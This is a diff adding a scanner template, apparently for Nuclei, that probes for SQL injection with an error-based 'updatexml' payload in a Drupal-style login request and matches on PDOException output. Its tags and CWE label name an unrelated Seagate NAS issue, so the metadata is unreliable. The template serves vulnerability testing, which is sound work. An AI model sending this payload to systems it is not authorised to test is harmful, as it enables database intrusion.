@@ -1,0 +1,28 @@
+id: SQL-Injection
+
+info:
+  name: SQL-Injection
+  author: SQL注入
+  severity: high
+  description: SQL injection vulnerability.
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-200
+  tags: cve,cve2018,seagate,nasos,disclosure,sql
+
+requests:
+  - raw:
+      - |
+        GET /?a=node2&destination2=node2&pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0x23,concat(1,md5({{num}})),1)%23]=bob&name[0]=a HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PDOException'
+          - '{{md5({{num}})}}'
+        condition: and
+
+# Enhanced by mp on 2022/07/05
